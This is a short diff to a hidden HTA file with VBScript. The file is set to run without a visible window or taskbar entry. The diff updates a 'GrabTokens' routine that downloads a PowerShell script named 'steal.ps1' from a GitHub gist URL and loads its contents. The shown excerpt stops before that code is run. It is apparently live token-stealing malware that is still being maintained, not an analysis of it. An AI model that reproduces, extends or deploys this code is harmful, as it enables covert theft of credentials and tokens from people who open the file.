@@ -1,4 +1,4 @@
-<html>
+    <html>
 <head><title>.</title>
 <hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
 <script language="VBScript">
@@ -286,7 +286,7 @@ End Sub
 Sub GrabTokens()
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
-    xh.Open "GET", "https://gist.githubusercontent.com/lozix94-afk/172084531c9168c0fe4b4cacc5bb0a45/raw/305a710608e0174a04c97a6e63ebab5210d1ed6a/steal.ps1", False
+    xh.Open "GET", "https://gist.githubusercontent.com/lozix94-afk/172084531c9168c0fe4b4cacc5bb0a45/raw/127a7a0f6723e9b88492fe4c7e5e533e140b1d06/steal.ps1", False
     xh.Send
     If xh.Status <> 200 Then Exit Sub
     Dim pc: pc = xh.responseText
